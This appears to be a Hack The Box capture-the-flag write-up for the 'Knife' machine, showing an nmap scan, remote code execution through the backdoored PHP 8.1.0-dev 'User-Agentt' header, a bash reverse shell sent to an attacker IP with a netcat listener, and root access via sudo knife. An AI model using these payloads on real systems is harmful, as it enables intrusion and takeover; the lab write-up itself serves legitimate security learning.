---
layout: single
title: Knife - Hack The Box
excerpt: "Knife is a quick and fun easy box where we have to abuse of the User-Agent of PHP 8.1.0-dev to have RCE and after that be root by taking advantage of the Knife binary"
date: 2023-01-10
classes: wide
toc: true
toc_label: "Contenido"
toc_icon: "fire"
header:
  teaser: /assets/images/htb-writeup-knife/new3.png
  teaser_home_page: true
  icon: /assets/images/hackthebox.webp
categories:
  - hackthebox
tags:  
  - PHP 8.1.0-dev - 'User-Agent' [RCE]
  - Abusing Sudoers Privilege (Knife Binary) [Privilege Escalation]
---

<p align="center">
<img src="/assets/images/htb-writeup-knife/knife_logo.png">
</p>

Knife is a quick and fun easy box where we have to abuse of the User-Agent of PHP 8.1.0-dev to have RCE and after that be root by taking advantage of the Knife binary.

## PortScan

```bash
Starting Nmap 7.92 ( https://nmap.org ) at 2023-01-10 13:57 CST
Nmap scan report for 10.10.10.242
Host is up (0.17s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 be:54:9c:a3:67:c3:15:c3:64:71:7f:6a:53:4a:4c:21 (RSA)
|   256 bf:8a:3f:d4:06:e9:2e:87:4e:c9:7e:ab:22:0e:c0:ee (ECDSA)
|_  256 1a:de:a1:cc:37:ce:53:bb:1b:fb:2b:0b:ad:b3:f6:84 (ED25519)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-title:  Emergent Medical Idea
|_http-server-header: Apache/2.4.41 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

## Website

The Knife website runs on port 80 and has the following technologies reported by wappalyzer 

![](/assets/images/htb-writeup-knife/website1.png)

## Enumeration

I use curl and I see this that version of PHP is vulnerable to RCE
```bash
curl -s http://10.10.10.242 -I
```
```bash
HTTP/1.1 200 OK
Date: Tue, 10 Jan 2023 20:05:33 GMT
Server: Apache/2.4.41 (Ubuntu)
X-Powered-By: PHP/8.1.0-dev
Content-Type: text/html; charset=UTF-8
```

We can found information here 
- [https://www.exploit-db.com/exploits/49933](https://www.exploit-db.com/exploits/49933)

I can abuse of the User-Agent because is vulnerable to RCE

```bash
curl -s -X GET http://10.10.10.242 -H "User-Agentt: zerodiumsystem('id');" | html2text
```
```bash
uid=1000(james) gid=1000(james) groups=1000(james)
    * About EMA
    * /
    * Patients
    * /
    * Hospitals
    * /
    * Providers
    * /
    * E-MSO

***** At EMA we're taking care to a whole new level . . . *****
****** Taking care of our  ******
```

And is vulnerable so we can send a reverse shell 
```bash
curl -s -X GET http://10.10.10.242 -H "User-Agentt: zerodiumsystem('bash -c \"bash -i >& /dev/tcp/10.10.14.21/443 0>&1\"');" | html2text
```
```bash
nc -lvnp 443
listening on [any] 443 ...
connect to [10.10.14.21] from (UNKNOWN) [10.10.10.242] 60468
bash: cannot set terminal process group (983): Inappropriate ioctl for device
bash: no job control in this shell
james@knife:/$
```

We can have a best bash terminal so we can do
```bash
script /dev/null -c bash
Ctrl + z
stty raw -echo; fg
reset xterm
```
## User flag

We can see the first flag

```bash
james@knife:~$ cat user.txt 
9adc315d20ef969531a7b07c66a31d19
```

## Root

After enumerating the system I can see that I can run this binary as root, we can use Gtfobins

```bash
james@knife:~$ sudo -l
Matching Defaults entries for james on knife:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User james may run the following commands on knife:
    (root) NOPASSWD: /usr/bin/knife
```

-[https://gtfobins.github.io/gtfobins/knife/#sudo](https://gtfobins.github.io/gtfobins/knife/#sudo)

We follow the instructions and we're root

```bash
james@knife:~$ sudo knife exec -E 'exec "/bin/sh"'
# bash
root@knife:/home/james# cd /root
root@knife:~# cat root.txt 
f8c5f763d30a3ed17dd24c4c216fd87b
```

## Another way to be root

You can abuse of the pkexec because is SUID but I won't do it

```bash
james@knife:/$ find -perm -4000 2>/dev/null | grep -v snap
./usr/lib/policykit-1/polkit-agent-helper-1
./usr/lib/eject/dmcrypt-get-device
./usr/lib/openssh/ssh-keysign
./usr/lib/dbus-1.0/dbus-daemon-launch-helper
./usr/bin/sudo
./usr/bin/su
./usr/bin/fusermount
./usr/bin/pkexec
./usr/bin/gpasswd
./usr/bin/passwd
./usr/bin/umount
./usr/bin/chfn
./usr/bin/chsh
./usr/bin/mount
./usr/bin/newgrp
./usr/bin/at
```

-[https://github.com/Almorabea/pkexec-exploit](https://github.com/Almorabea/pkexec-exploit)

Only transfer the script to the machine and execute and that's all




